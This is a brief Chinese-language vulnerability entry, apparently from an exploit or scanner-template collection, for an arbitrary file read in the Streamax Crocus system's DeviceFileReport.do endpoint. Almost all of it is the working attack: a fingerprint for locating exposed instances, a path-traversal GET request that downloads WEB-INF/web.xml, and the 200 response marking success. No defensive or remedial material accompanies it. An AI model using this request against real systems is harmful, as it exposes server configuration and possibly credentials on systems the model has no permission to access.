# 锐明技术Crocus系统DeviceFileReport.do存在任意文件读取漏洞

锐明技术Crocus系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="inp_verification"`
- **请求**：`GET /DeviceFileReport.do?Action=Download&FilePath=/../WEB-INF/web.xml HTTP/1.1`
- **响应特征**：200